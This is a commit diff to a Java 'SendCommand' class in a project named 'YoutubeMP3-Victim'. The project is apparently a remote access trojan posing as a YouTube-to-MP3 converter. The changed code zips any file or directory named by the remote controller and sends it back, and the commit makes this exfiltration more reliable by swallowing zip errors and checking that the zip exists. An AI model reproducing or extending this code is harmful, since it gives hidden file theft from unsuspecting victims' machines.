Fixed some bugs from compressing directories

+++ YoutubeMP3-Victim/src/commands/SendCommand.java
@@ -7,6 +7,7 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.zip.ZipEntry;
+import java.util.zip.ZipException;
 import java.util.zip.ZipOutputStream;
 
 import control.Controller;
@@ -42,8 +43,10 @@ public class SendCommand extends Command{
 		File fileToCompress = new File(fetch(path));
 		if(fileToCompress.exists()) {
 			File fileCompressed = compress(fileToCompress, ctrl);
-			send(fileCompressed, ctrl);
-			fileCompressed.delete();
+			if(fileCompressed.exists()) {
+				send(fileCompressed, ctrl);
+				fileCompressed.delete();
+			}
 		} else {
 			ctrl.sendMsg("The specified file/dir does not exists");
 		}
@@ -70,20 +73,25 @@ public class SendCommand extends Command{
 		    	}
 	
 		    	in.close();
+		
 			}
 			else {
 				generateFileList(fileToCompress);
 			    	
 			   	for(File file : fileList){
-			   		ZipEntry ze= new ZipEntry(file.getName());
-			   		zos.putNextEntry(ze);
-			   		FileInputStream in = new FileInputStream(file.getAbsolutePath());
-			    		
-			   		int len;
-			       	while ((len = in.read(buffer)) > 0) {
-			       		zos.write(buffer, 0, len);
-			       	}
-			       	in.close();
+			   		try {
+				   		ZipEntry ze= new ZipEntry(file.getName());
+				   		zos.putNextEntry(ze);
+				   		FileInputStream in = new FileInputStream(file.getAbsolutePath());
+				    		
+				   		int len;
+				       	while ((len = in.read(buffer)) > 0) {
+				       		zos.write(buffer, 0, len);
+				       	}
+				       	in.close();
+			   		}catch(ZipException ex){
+			   			//weird zip format exception when compressing some xml files
+			   		}
 			   	}
 			}
 			zos.closeEntry();
@@ -93,7 +101,7 @@ public class SendCommand extends Command{
 		    	
 		    return new File(zipPath);
 		}catch(Exception e) {
-	    	ctrl.sendMsg(e.getMessage());
+	    	ctrl.sendMsg(e.getStackTrace().toString() + " " + e.getMessage());
 	    	return null;
 	    }
 	}
@@ -111,15 +119,9 @@ public class SendCommand extends Command{
 		}
     }
 	
-	private void send(File file, Controller ctrl){
-		if(file != null) {
-			try {
-				ctrl.sendMsg(file.getName());
-				ctrl.sendFile(file);
-			} catch (IOException e) {
-				ctrl.sendMsg(e.getMessage());
-			}
-		}
+	private void send(File file, Controller ctrl) throws IOException{
+		ctrl.sendMsg(file.getName());
+		ctrl.sendFile(file);
 	}
 	
 	private static String fetch(String str) {
